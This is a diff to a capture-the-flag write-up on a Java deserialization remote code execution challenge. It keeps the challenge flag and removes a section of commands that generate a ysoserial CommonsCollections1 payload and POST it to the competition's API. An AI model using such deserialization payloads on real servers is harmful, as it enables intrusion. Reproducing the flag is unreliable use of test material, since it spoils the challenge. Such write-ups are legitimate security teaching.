@@ -157,36 +157,6 @@ The server simulated Remote Code Execution (RCE) via the deserialization gadget 
 CSC26{j4v4_d3s3r14l1z4t10n_rce_1337_h4ck3r}
 ```
 
-### Verification
-
-You can verify this solution by following these steps:
-
-```bash
-# 1. Download ysoserial
-wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
-  -O /tmp/ysoserial.jar
-
-# 2. Generate CommonsCollections1 payload with 'id' command
-java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
-     --add-opens java.base/java.lang=ALL-UNNAMED \
-     -jar /tmp/ysoserial.jar CommonsCollections1 'id' | base64 -w0 > /tmp/cc1.b64
-
-# 3. Send payload to the API
-curl -s -X POST -H "Content-Type: application/json" \
-  -d "{\"data\":\"$(cat /tmp/cc1.b64)\"}" \
-  https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
-```
-
-Or as a one-liner:
-
-```bash
-java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
-     --add-opens java.base/java.lang=ALL-UNNAMED \
-     -jar /tmp/ysoserial.jar CommonsCollections1 'id' 2>/dev/null | base64 -w0 | \
-  xargs -I{} curl -s -X POST -H "Content-Type: application/json" \
-    -d '{"data":"{}"}' \
-    https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
-```
 
 ### Tools Used
 - `curl` — HTTP requests and endpoint probing
